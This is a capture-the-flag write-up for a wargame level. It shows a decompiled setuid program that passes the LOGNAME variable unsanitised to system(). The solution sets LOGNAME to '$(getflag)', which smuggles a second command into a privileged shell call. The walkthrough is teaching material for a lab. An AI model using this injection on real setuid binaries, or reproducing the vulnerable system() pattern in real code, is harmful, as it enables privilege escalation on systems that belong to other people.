# Level07

[FRENCH version](README.md)

## How to retrieve the flag

By decompiling level07, here is its source code:

```
void main(void)
{
    undefined4 uVar1;
    undefined4 uStack28;
    undefined4 uStack24;
    undefined4 uStack20;
    
    uStack24 = getegid();
    uStack20 = getegid();
    setresgid(uStack24, uStack24, uStack24);
    setresuid(uStack20, uStack20, uStack20);
    uStack28 = 0;
    uVar1 = getenv("LOGNAME");
    asprintf(&uStack28, "/bin/echo %s ", uVar1);
    system(uStack28);
    return;
}
```

You can see that the program retrieves the content of the LOGNAME environment variable and displays it.

We cannot use a symbolic link here because echo is called directly with its absolute path.

You just have to use a sub-shell

```
export LOGNAME='$(getflag)'
/level07
```

## The flag

The flag read is the one that can be used to connect to level06.